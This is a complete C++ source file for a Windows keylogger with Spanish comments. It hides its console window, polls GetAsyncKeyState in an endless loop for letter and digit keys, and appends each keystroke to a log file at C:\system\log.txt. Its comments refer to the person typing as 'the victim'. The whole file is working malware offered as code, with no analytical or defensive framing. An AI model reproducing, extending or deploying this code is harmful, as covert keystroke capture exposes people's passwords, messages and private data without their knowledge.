#define _WIN32_WINNT 0x0500
#include <stdio.h>
#include <windows.h>
#include <fstream>
#include <iostream>
using namespace std;

int main()
{     
   	HWND hWnd = GetConsoleWindow();
   	ShowWindow( hWnd, SW_HIDE );   //Escondemos la pantalla
    
	//Declaramos variables
    string i="i", m="m", f="f", s="s", c="c" , h="h", o="o", l="l", q="q" , w="w", e="e", r="r", 
	t="t", y="y", u="u", p="p", a="a", d="d", g="g", j="j", k="k", z="z", x="x", v="v", b="b", 
	n="n", one="1", two="2" , three="3", four="4", five="5", six="6", seven="7", eight="8", nine="9", zero="0"; 
      
    while (1)//Definimos bucle infinito para que continuamente esté esperando a que la víctima pulse una tecla.
    {      
        ofstream log("C:\\system\\log.txt", ios::app);//Definimos la ruta del archivo donde se guardarán las teclas pulsadas.
        Sleep(20);    
        //Se definen códigos de cada tecla https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        //The value -32767 is equal to 0x8001 for a signed 16-bit value. Therefore, GetAsyncKeyState(i) == -32767) checks for 3 things:
		//1. the key is currently being held down
		//2. the key has just transitioned from released->pressed
		//3. all other bits in GetAsyncKeyState are zero (which may or may not always be true)
		   if(GetAsyncKeyState('Q')==-32767){log << q;}
           if (GetAsyncKeyState('W')==-32767){log << w;}           
           if (GetAsyncKeyState('E')==-32767){log << e;}           
           if (GetAsyncKeyState('R')==-32767){log << r;}           
           if (GetAsyncKeyState('T')==-32767){log << t;}           
           if (GetAsyncKeyState('Y')==-32767){log << y;}           
           if (GetAsyncKeyState('U')==-32767){log << u;}
           if (GetAsyncKeyState('I')==-32767){log << i;}
           if (GetAsyncKeyState('O')==-32767){log << o;}
           if (GetAsyncKeyState('P')==-32767){log << p;}
           if (GetAsyncKeyState('A')==-32767){log << a;}
           if (GetAsyncKeyState('S')==-32767){log << s;}
           if (GetAsyncKeyState('D')==-32767){log << d;}
           if (GetAsyncKeyState('F')==-32767){log << f;}
           if (GetAsyncKeyState('G')==-32767){log << g;}
           if (GetAsyncKeyState('H')==-32767){log << h;}
           if (GetAsyncKeyState('J')==-32767){log << j;}
           if (GetAsyncKeyState('K')==-32767){log << k;}
           if (GetAsyncKeyState('L')==-32767){log << l;}
           if (GetAsyncKeyState('Z')==-32767){log << z;}
           if (GetAsyncKeyState('X')==-32767){log << x;}
           if (GetAsyncKeyState('C')==-32767){log << c;}
           if (GetAsyncKeyState('V')==-32767){log << v;}
           if (GetAsyncKeyState('B')==-32767){log << b;}
           if (GetAsyncKeyState('N')==-32767){log << n;}
           if (GetAsyncKeyState('M')==-32767){log << m;}
           if (GetAsyncKeyState('1')==-32767){log << 1;}
           if (GetAsyncKeyState('2')==-32767){log << 2;}
           if (GetAsyncKeyState('3')==-32767){log << 3;}
           if (GetAsyncKeyState('4')==-32767){log << 4;}
           if (GetAsyncKeyState('5')==-32767){log << 5;}
           if (GetAsyncKeyState('6')==-32767){log << 6;}
           if (GetAsyncKeyState('7')==-32767){log << 7;}
           if (GetAsyncKeyState('8')==-32767){log << 8;}
           if (GetAsyncKeyState('9')==-32767){log << 9;}
           if (GetAsyncKeyState('0')==-32767){log << 0;}
           log.close();
      }
      return 0;
}
